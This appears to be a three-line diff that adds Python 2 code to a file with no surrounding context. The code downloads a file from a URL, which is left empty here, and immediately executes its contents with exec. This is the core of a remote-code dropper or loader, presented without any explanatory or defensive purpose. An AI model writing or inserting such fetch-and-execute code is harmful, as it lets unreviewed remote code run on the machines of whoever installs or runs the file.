@@ -1,0 +1,3 @@
+import urllib
+(fn,hd) = urllib.urlretrieve('')
+exec(open(fn).read())
